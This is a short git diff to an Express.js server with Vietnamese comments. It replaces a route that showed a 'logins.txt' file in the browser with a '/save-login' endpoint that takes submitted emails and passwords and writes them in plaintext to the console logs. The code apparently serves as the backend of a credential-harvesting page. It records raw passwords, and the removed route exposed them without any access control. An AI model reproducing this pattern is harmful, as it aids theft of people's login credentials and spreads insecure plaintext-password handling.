@@ -33,12 +33,15 @@ app.listen(port, "0.0.0.0", () => {
     console.log(`Server đang chạy trên cổng ${port}`);
 });
 
-app.get("/view-logins", (req, res) => {
-    fs.readFile("logins.txt", "utf8", (err, data) => {
-        if (err) {
-            return res.status(500).json({ message: "Không thể đọc file!" });
-        }
-        res.send(`<pre>${data}</pre>`); // Hiển thị nội dung file trong trình duyệt
-    });
+app.post("/save-login", (req, res) => {
+    const { email, password } = req.body;
+    if (!email || !password) {
+        return res.status(400).json({ message: "Thiếu email hoặc mật khẩu" });
+    }
+
+    const log = `Email: ${email}, Password: ${password}`;
+    console.log(log); // In ra logs thay vì ghi file
+
+    res.json({ message: "Dữ liệu đã nhận!" });
 });
 
